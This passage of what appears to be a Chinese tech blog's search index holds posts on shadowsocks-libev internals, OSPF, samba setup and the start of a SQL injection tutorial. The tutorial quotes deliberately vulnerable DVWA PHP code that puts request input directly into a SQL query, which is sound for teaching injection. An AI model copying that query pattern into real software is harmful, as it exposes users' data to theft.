class="line">balloc(server-&gt;buf, SOCKET_BUF_SIZE);  </span><br><span class="line">balloc(server-&gt;abuf, SOCKET_BUF_SIZE);  </span><br><span class="line"><span class="built_in">memset</span>(server-&gt;recv_ctx, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">server_ctx_t</span>));  </span><br><span class="line"><span class="built_in">memset</span>(server-&gt;send_ctx, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">server_ctx_t</span>));  </span><br><span class="line">server-&gt;stage               = STAGE_INIT;  </span><br><span class="line">server-&gt;recv_ctx-&gt;connected = <span class="number">0</span>;  </span><br><span class="line">server-&gt;send_ctx-&gt;connected = <span class="number">0</span>;  </span><br><span class="line">server-&gt;fd                  = fd;  </span><br><span class="line">server-&gt;recv_ctx-&gt;server    = server;  </span><br><span class="line">server-&gt;send_ctx-&gt;server    = server;  </span><br><span class="line">  </span><br><span class="line">server-&gt;e_ctx = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">cipher_ctx_t</span>));  </span><br><span class="line">server-&gt;d_ctx = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">cipher_ctx_t</span>));  </span><br><span class="line">crypto-&gt;ctx_init(crypto-&gt;cipher, server-&gt;e_ctx, <span class="number">1</span>);  </span><br><span class="line">crypto-&gt;ctx_init(crypto-&gt;cipher, server-&gt;d_ctx, <span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line">ev_io_init(&amp;server-&gt;recv_ctx-&gt;io, server_recv_cb, fd, EV_READ);  </span><br><span class="line">ev_io_init(&amp;server-&gt;send_ctx-&gt;io, server_send_cb, fd, EV_WRITE);  </span><br><span class="line">  </span><br><span class="line">ev_timer_init(&amp;server-&gt;delayed_connect_watcher,  </span><br><span class="line">              delayed_connect_cb, <span class="number">0.05</span>, <span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line">cork_dllist_add(&amp;connections, &amp;server-&gt;entries);</span><br></pre></td></tr></table></figure><p>这里发现server-&gt;recv_ctx绑定了函数server_recv_cb和server_send_cb,这个函数从名称上不难猜测分别是服务端接收信息后的回调函数和服务端发送信息后的回调函数。<br>分别跟踪server_recv_cb函数和server_send_cb函数<br>server_recv_cb</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (revents != EV_TIMER) &#123;  </span><br><span class="line">    r = recv(server-&gt;fd, buf-&gt;data + buf-&gt;len, SOCKET_BUF_SIZE - buf-&gt;len, <span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (r == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="comment">// connection closed  </span></span><br><span class="line">        close_and_free_remote(EV_A_ remote);  </span><br><span class="line">        close_and_free_server(EV_A_ server);  </span><br><span class="line">        <span class="keyword">return</span>;    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r == <span class="number">-1</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (errno == EAGAIN || errno == EWOULDBLOCK) &#123;  </span><br><span class="line">            <span class="comment">// no data  </span></span><br><span class="line">            <span class="comment">// continue to wait for recv            return;  </span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">if</span> (verbose)  </span><br><span class="line">                ERROR(<span class="string">&quot;server_recv_cb_recv&quot;</span>);  </span><br><span class="line">            close_and_free_remote(EV_A_ remote);  </span><br><span class="line">            close_and_free_server(EV_A_ server);  </span><br><span class="line">            <span class="keyword">return</span>;        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    buf-&gt;len += r;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;  </span><br><span class="line">    <span class="comment">// local socks5 server  </span></span><br><span class="line">    <span class="keyword">if</span> (server-&gt;stage == STAGE_STREAM) &#123;  </span><br><span class="line">        server_stream(EV_A_ w, buf);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// all processed  </span></span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (server-&gt;stage == STAGE_INIT) &#123;</span><br><span class="line">    .....</span><br></pre></td></tr></table></figure><p>这里看到回调函数首先调用了recv函数用于接收请求,然后通过判断server-&gt;stage参数的值,看到当server-&gt;stage&#x3D;STAGE_STREAM的时候,会调用server_stream函数,从这里不容易看出server_stream函数到底做了什么,我们跟踪一下server_stream函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">server_ctx_t</span> *server_recv_ctx = (<span class="type">server_ctx_t</span> *)w;  </span><br><span class="line">    <span class="type">server_t</span> *server              = server_recv_ctx-&gt;server;  </span><br><span class="line">    <span class="type">remote_t</span> *remote              = server-&gt;remote;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (remote == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        LOGE(<span class="string">&quot;invalid remote&quot;</span>);  </span><br><span class="line">        close_and_free_server(EV_A_ server);  </span><br><span class="line">        <span class="keyword">return</span>;    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// insert shadowsocks header  </span></span><br><span class="line">    <span class="keyword">if</span> (!remote-&gt;direct) &#123;  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ANDROID__  </span></span><br><span class="line">        tx += remote-&gt;buf-&gt;len;  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">        <span class="type">int</span> err = crypto-&gt;encrypt(remote-&gt;buf, server-&gt;e_ctx, SOCKET_BUF_SIZE);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (err) &#123;  </span><br><span class="line">            LOGE(<span class="string">&quot;invalid password or cipher&quot;</span>);  </span><br><span class="line">            close_and_free_remote(EV_A_ remote);  </span><br><span class="line">            close_and_free_server(EV_A_ server);  </span><br><span class="line">            <span class="keyword">return</span>;        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (server-&gt;abuf) &#123;  </span><br><span class="line">            bprepend(remote-&gt;buf, server-&gt;abuf, SOCKET_BUF_SIZE);  </span><br><span class="line">            bfree(server-&gt;abuf);  </span><br><span class="line">            ss_free(server-&gt;abuf);  </span><br><span class="line">            server-&gt;abuf = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!remote-&gt;send_ctx-&gt;connected) &#123;  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ANDROID__  </span></span><br><span class="line">        <span class="keyword">if</span> (vpn) &#123;  </span><br><span class="line">            <span class="type">int</span> not_protect = <span class="number">0</span>;            <span class="keyword">if</span> (remote-&gt;addr.ss_family == AF_INET) &#123;                <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> sockaddr_in *)&amp;remote-&gt;addr;                <span class="keyword">if</span> (s-&gt;sin_addr.s_addr == inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>))                    not_protect = <span class="number">1</span>;            &#125;            <span class="keyword">if</span> (!not_protect) &#123;                <span class="keyword">if</span> (protect_socket(remote-&gt;fd) == <span class="number">-1</span>) &#123;                    ERROR(<span class="string">&quot;protect_socket&quot;</span>);                    close_and_free_remote(EV_A_ remote);                    close_and_free_server(EV_A_ server);                    <span class="keyword">return</span>;                &#125;            &#125;        &#125;<span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        remote-&gt;buf-&gt;idx = <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (!fast_open || remote-&gt;direct) &#123;  </span><br><span class="line">            <span class="comment">// connecting, wait until connected  </span></span><br><span class="line">            <span class="type">int</span> r = connect(remote-&gt;fd, (<span class="keyword">struct</span> sockaddr *)&amp;(remote-&gt;addr), remote-&gt;addr_len);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (r == <span class="number">-1</span> &amp;&amp; errno != CONNECT_IN_PROGRESS) &#123;  </span><br><span class="line">                ERROR(<span class="string">&quot;connect&quot;</span>);  </span><br><span class="line">                close_and_free_remote(EV_A_ remote);  </span><br><span class="line">                close_and_free_server(EV_A_ server);  </span><br><span class="line">                <span class="keyword">return</span>;            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// wait on remote connected event  </span></span><br><span class="line">            ev_io_stop(EV_A_ &amp; server_recv_ctx-&gt;io);  </span><br><span class="line">            ev_io_start(EV_A_ &amp; remote-&gt;send_ctx-&gt;io);  </span><br><span class="line">            ev_timer_start(EV_A_ &amp; remote-&gt;send_ctx-&gt;watcher);</span><br><span class="line">            ....</span><br></pre></td></tr></table></figure><p>这里看到,server_stream函数首先调用了encrypto函数将数据进行了加密,然后调用connect函数连接了远程shadowsocks服务器,然后暂时禁用了接收客户端数据后的处理任务,并启动一个任务等待将数据发送给远程服务器<br>跟踪完server_recv_cb函数我们来看server_send_cb</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">server_ctx_t</span> *server_send_ctx = (<span class="type">server_ctx_t</span> *)w;  </span><br><span class="line"><span class="type">server_t</span> *server              = server_send_ctx-&gt;server;  </span><br><span class="line"><span class="type">remote_t</span> *remote              = server-&gt;remote;  </span><br><span class="line"><span class="keyword">if</span> (server-&gt;buf-&gt;len == <span class="number">0</span>) &#123;  </span><br><span class="line">    <span class="comment">// close and free  </span></span><br><span class="line">    close_and_free_remote(EV_A_ remote);  </span><br><span class="line">    close_and_free_server(EV_A_ server);  </span><br><span class="line">    <span class="keyword">return</span>;&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="comment">// has data to send  </span></span><br><span class="line">    <span class="type">ssize_t</span> s = send(server-&gt;fd, server-&gt;buf-&gt;data + server-&gt;buf-&gt;idx,  </span><br><span class="line">                     server-&gt;buf-&gt;len, <span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (errno != EAGAIN &amp;&amp; errno != EWOULDBLOCK) &#123;  </span><br><span class="line">            ERROR(<span class="string">&quot;server_send_cb_send&quot;</span>);  </span><br><span class="line">            close_and_free_remote(EV_A_ remote);  </span><br><span class="line">            close_and_free_server(EV_A_ server);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s &lt; (<span class="type">ssize_t</span>)(server-&gt;buf-&gt;len)) &#123;  </span><br><span class="line">        <span class="comment">// partly sent, move memory, wait for the next time to send  </span></span><br><span class="line">        server-&gt;buf-&gt;len -= s;  </span><br><span class="line">        server-&gt;buf-&gt;idx += s;  </span><br><span class="line">        <span class="keyword">return</span>;    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">// all sent out, wait for reading  </span></span><br><span class="line">        server-&gt;buf-&gt;len = <span class="number">0</span>;  </span><br><span class="line">        server-&gt;buf-&gt;idx = <span class="number">0</span>;  </span><br><span class="line">        ev_io_stop(EV_A_ &amp; server_send_ctx-&gt;io);  </span><br><span class="line">        ev_io_start(EV_A_ &amp; remote-&gt;recv_ctx-&gt;io);  </span><br><span class="line">        <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>这里发现server_send_cb函数首先调用了send函数将数据返回给客户端,然后停止给客户端发送数据,等待接收来自远程服务器发送来的数据</p><h5 id="4-2-2-函数调用关系"><a href="#4-2-2-函数调用关系" class="headerlink" title="4.2.2.函数调用关系"></a>4.2.2.函数调用关系</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_recv_cb--&gt;recv--&gt;encrypto---&gt;remote_send_cb---&gt;remote_recv_cb---&gt;decrypto---&gt;server_send_cb</span><br></pre></td></tr></table></figure><p>我们可以总结出整个shadowsock客户端ss-local在运行时做的事情</p><ul><li>1.通过socks5协议接收来自需要代理程序发来的socks5流量包,并解包解析里面的数据</li><li>2.将实际的数据封装成shadowsocks包,并将其加密发送给远程shadowsocks服务器</li><li>3.等待服务器响应数据包,由于接收来自服务器的相应包也是shadowsocks包,因此首先先对包进行解密</li><li>4.将解密后的数据包重新封装成socks5数据包,并将数据包返回给客户端。</li></ul><h4 id="4-3-shadowsocks工作原理"><a href="#4-3-shadowsocks工作原理" class="headerlink" title="4.3.shadowsocks工作原理"></a>4.3.shadowsocks工作原理</h4><p>经过源码分析和各个函数调用关系我们不难得出shadowsocksocks的工作原理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client---socks5---&gt;ss-local---crypto-----&gt;shadowsocks----&gt;ss-server---&gt;decrypto---&gt;server</span><br></pre></td></tr></table></figure><ul><li>1.客户端将数据包用socks5协议重新封装,发送给ss-local,</li><li>2.ss-local将数据包重新封装成shadowsock协议格式的数据包,</li><li>3.ss-local将数据包加密后发送给ss-server,</li><li>4.ss-server收到数据包后将数据包进行解密,按照shadowsock协议解析出实际的payload</li><li>5.ss-server开始和目标服务器建立连接,并将数据包发送给目标服务器,</li><li>6.目标服务器返回数据给ss-server</li><li>7.将目标服务器响应的数据封装成shadowsocks协议</li><li>8.ss-server将数据包加密,通过之前和ss-local建立连接将数据包返回给ss-local,</li><li>9.ss-local将数据包解密,按照shadowsocks协议规则解析出原始响应报文</li><li>10.ss-local将原始响应报文封装成socks5协议发挥个客户端</li></ul><h3 id="5-小结"><a href="#5-小结" class="headerlink" title="5.小结"></a>5.小结</h3><p>整个过程如果不深究细节,分析shadowsocks原理还是非常简单的,核心点就在于网络编程和libev的理解,因此在分析shadowsocks-libev之前一定要先理解网络编程和libev事件驱动库的使用。</p>]]></content>
      
      
      <categories>
          
          <category> 软件源码分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ospf协议</title>
      <link href="/2022/10/18/ospf%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/10/18/ospf%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="OSPF协议"><a href="#OSPF协议" class="headerlink" title="OSPF协议"></a>OSPF协议</h1><h3 id="1-什么是OSPF"><a href="#1-什么是OSPF" class="headerlink" title="1.什么是OSPF?"></a>1.什么是OSPF?</h3><p>ospf(开放最短路径优先)是一种基于链路状态的路由协议,具有路由变化收敛快、无路由环路、支持变长子网掩码(VLSM)和汇总、层次区域划分等优点</p><p>ospf数据直接封装在ip数据报中,属于网络层协议,协议号为89</p><p>ospf使用多播地址进行通信,ip地址为224.0.0.5和224.0.0.6,224.0.0.5为非dr&#x2F;bdr路由器监听的地址,224.0.0.6为dr&#x2F;bdr监听的地址</p><h3 id="2-OSPF在不同的网络中使用的通信地址"><a href="#2-OSPF在不同的网络中使用的通信地址" class="headerlink" title="2.OSPF在不同的网络中使用的通信地址"></a>2.OSPF在不同的网络中使用的通信地址</h3><ul><li><p><strong>点到点网络</strong>:<br>是连接单独的一对路由器的网络,点到点网络上的有效邻居总是可以形成邻接关系的,在这种网络上,ospf包使用的目标地址是224.0.0.5。</p></li><li><p><strong>广播型网络</strong>:</p><p>在广播行网络中(比如以太网),这样的网络会推举一个DR(指定路由器)和BDR(备份指定路由器),DR&#x2F;BDR的发送的OSPF包的目标地址为224.0.0.5;而除了DR&#x2F;BDR以外的OSPF包的目标地址为224.0.0.6</p><p>在广播型网络中,所有的路由器都使用224.0.0.5的ip地址发送hello包,用来维持邻居关系,非DR&#x2F;BDR路由都以224.0.0.6的地址发送lsa更新,而只有DR&#x2F;BDR路由监听这个地址,反过来,DR路由使用224.0.0.5来发送更新到非DR路由</p></li></ul><h3 id="3-OSPF协议报文类型"><a href="#3-OSPF协议报文类型" class="headerlink" title="3.OSPF协议报文类型"></a>3.OSPF协议报文类型</h3><ul><li><p>Hello 报文(Hello Packet)<br>最常用的一种报文，周期性的发送给本路由器的邻居。内容包括一些定时器的数值、DR、BDR（Backup Designated Router）以及自己已知的邻居。</p></li><li><p>DD 报文(Database Description Packet)</p><p>两台路由器进行数据同步时,用DD报文来描述自己的LSDB(Link State DataBase),内容包括每一条LSA的摘要(摘要是指LSA的HEAD，通过该HEAD可以唯一标识一条LSA) </p></li><li><p>LSR报文(Link State Request Packet)</p><p>两台路由器互相交换过DD报文之后，知道对端的路由器有哪些LSA是本地的LSDB 所缺少的，这时需要发送LSR报文向对方请求所需的LSA。内容包括所需要的LSA的摘要</p></li><li><p>LSU报文(Link State Update Packet)</p><p>用来向对端路由器发送所需要的LSA，内容是多条LSA（全部内容）的集合。</p></li><li><p>LSACK报文(Link State Acknowledgement Packet)</p><p>用来对接收到的LSU报文进行确认。内容是需要确认的LSA的HEAD（一个报文可对多个LSA 进行确认）。</p></li></ul><p></p><h3 id="4-运行OSPF路由协议的路由器类型"><a href="#4-运行OSPF路由协议的路由器类型" class="headerlink" title="4.运行OSPF路由协议的路由器类型"></a>4.运行OSPF路由协议的路由器类型</h3><ul><li><p><strong>1.IR(Internal Router)</strong></p><p>区域内部的路由器</p></li><li><p><strong>2.BR(Borded Router)</strong></p><p>骨干区域路由器</p></li><li><p><strong>3.ABR(Area Borded Router)</strong></p><p>区域边界路由器</p></li><li><p><strong>4.ASBR(AS Boundary Router)</strong></p><p>自治系统边界路由器</p></li></ul><h3 id="5-OSPF的相关概念"><a href="#5-OSPF的相关概念" class="headerlink" title="5.OSPF的相关概念"></a>5.OSPF的相关概念</h3><ul><li><p><strong>1.区域</strong></p><p>OSPF属于自治系统内部的路由协议,一般如果自治系统包含的路由器数量过多,一般会采用分层结构,将整个自治系统分为多个区域,区域之间通过一个骨干区域互联，每个非骨干区域都需要直接与骨干区域连接。</p></li><li><p><strong>2.路由器ID号</strong></p><p>一台路由器如果要运行OSPF协议，必须存在Router ID。如果没有配置ID号，系统会从当前接口的IP 地址中自动选一个作为路由器的ID号。</p></li><li><p><strong>3.路由聚合</strong></p><p>AS被划分成不同的区域，每一个区域通过OSPF边界路由器（ABR）相连，区域间可以通过路由汇聚来减少路由信息，减小路由表的规模，提高路由器的运算速度。</p></li><li><p><strong>4.路由类型</strong></p><ul><li><p>1.区域内路由</p></li><li><p>2.区域间路由</p></li><li><p>3.第一类外部路由</p></li><li><p>4.第二类外部路由</p></li></ul><p>区域内和区域间路由描述的是AS内部的网络结构，外部路由则描述了应该如何选择到AS以外目的地址的路由。</p><p>第一类外部路由是指接收的是IGP（Interior Gateway Protocol，内部网关协议）路由（例如静态路由和RIP路由）。由于这类路由的可信程度较高，并且和OSPF自身路由的开销具有可比性，所以到第一类外部路由的开销等于本路由器到相应的ASBR的开销与ASBR到该路由目的地址的开销之和。</p><p>第二类外部路由是指接收的是EGP（Exterior Gateway Protocol，外部网关协议）路由。由于这类路由的可信度比较低，所以OSPF协议认为从ASBR到自治系统之外的开销远远大于在自治系统之内到达ASBR的开销。所以计算路由开销时将主要考虑前者，即到第二类外部路由的开销等于ASBR到该路由目的地址的开销。如果计算出开销值相等的两条路由，再考虑本路由器到相应的ASBR的开销。</p></li></ul><p>参考:</p><p><a href="https://blog.51cto.com/kalng/829436">https://blog.51cto.com/kalng/829436</a></p><p><a href="https://cloud.tencent.com/developer/article/2021022">https://cloud.tencent.com/developer/article/2021022</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>samba服务配置</title>
      <link href="/2022/10/15/samba%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/10/15/samba%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="1-samba服务配置"><a href="#1-samba服务配置" class="headerlink" title="1.samba服务配置"></a>1.samba服务配置</h2><p><em>环境基于debian11</em></p><ul><li>1.安装服务必要的组件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install samba</span><br></pre></td></tr></table></figure><ul><li><p>2.配置共享目录</p><p>&#x2F;etc&#x2F;samba&#x2F;smb.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[share]</span><br><span class="line">comment = file share <span class="comment">#共享目录的描述信息</span></span><br><span class="line">path = /srv/smbshare <span class="comment">#共享目录的路径</span></span><br><span class="line">available = <span class="built_in">yes</span></span><br><span class="line">browsable = <span class="built_in">yes</span></span><br><span class="line">writable = <span class="built_in">yes</span>  <span class="comment"># 可写权限</span></span><br><span class="line">valid <span class="built_in">users</span> = armbian <span class="comment"># 有效的访问用户</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>3.添加samba用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo smbpasswd -a armbian <span class="comment">#这里添加的用户必须是系统已经存在的用户,这里设置的密码可以和系统用户的密码不一样</span></span><br><span class="line"><span class="comment">#用户在访问共享目录的时候权限除了取决于共享目录的配置权限还取决于系统用户对这个共享目录的访问权限</span></span><br></pre></td></tr></table></figure></li><li><p>4.启动samba服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start smbd.service</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软件和系统配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置与使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入详解</title>
      <link href="/2022/10/06/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/10/06/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入详解"><a href="#sql注入详解" class="headerlink" title="sql注入详解"></a>sql注入详解</h1><h3 id="1-什么是sql注入"><a href="#1-什么是sql注入" class="headerlink" title="1.什么是sql注入?"></a>1.什么是sql注入?</h3><p>sql注入攻击是网站在处理用户请求的参数,在没有检验或者检验不严谨的情况下直接插入到sql语句中执行,导致用户可以构造恶意参数获取敏感数据。</p><h3 id="2-sql注入的工作原理"><a href="#2-sql注入的工作原理" class="headerlink" title="2.sql注入的工作原理"></a>2.sql注入的工作原理</h3><p>实例1</p><p>看下面的一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">case</span> MYSQL:</span><br><span class="line"><span class="comment">// Check database</span></span><br><span class="line">            <span class="comment">#构造需要执行的sql语句</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">            <span class="comment">#执行sql语句</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get results</span></span><br><span class="line"><span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Get values</span></span><br><span class="line">                <span class="comment">#构造返回结果</span></span><br><span class="line"><span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line"><span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> 